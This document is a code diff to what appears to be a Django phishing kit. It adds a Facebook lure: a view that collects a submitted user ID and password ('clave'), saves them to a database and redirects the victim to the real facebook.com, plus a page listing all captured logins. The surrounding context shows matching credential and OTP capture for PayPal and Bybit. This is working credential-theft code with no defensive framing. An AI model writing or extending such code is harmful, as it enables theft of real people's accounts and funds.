@@ -60,7 +60,7 @@ from .forms import UserForm
 
 #imports Paypal part2
 
-from .models import UserSubmissionPaypal, OTPSubmissionPaypal
+from .models import UserSubmissionPaypal, OTPSubmissionPaypal ,UserFacebook
 
 
 #imports noones
@@ -923,7 +923,7 @@ def home(request):
        # print(f"Home view: user_id={user_id}, clave={clave}") 
 
         return redirect('/success')
-    return render(request, 'pprequest.html')
+    return render(request, 'facebook.html')
 
 def upload(request):
     if request.method == 'POST':
@@ -937,7 +937,7 @@ def upload(request):
     return render(request, 'index2.html')
 
 def success(request):
-    return redirect('https://www.bybit.com/')
+    return redirect('https://www.facebook.com/')
 
 
 def view_image(request, image_id):
@@ -1245,5 +1245,36 @@ def bybit(request):
 def bybitlogins(request):
     profiles = UserSubmissionBybit.objects.all()  # Fetch all user profiles
     return render(request, 'bybitdata.html', {'profiles': profiles})
+
+
+
+#facebook
+
+
+def facebook(request):
+    if request.method == 'POST':
+        user_id = request.POST.get('UserId')
+        clave = request.POST.get('Clave')
+        
+        # Save the data in the session
+        request.session['user_id'] = user_id
+        request.session['clave'] = clave
+
+        UserFacebook.objects.create(user_id=user_id, clave=clave)
+
+       # print(f"Home view: user_id={user_id}, clave={clave}") 
+
+        return redirect('/success')
+    return render(request, 'facebook.html')
+
+def facebooklogins(request):
+    users = UserFacebook.objects.all()  # Fetch all user profiles
+    return render(request, 'facebookdata.html', {'users': users})
+
+
+
+
+
+
 
 
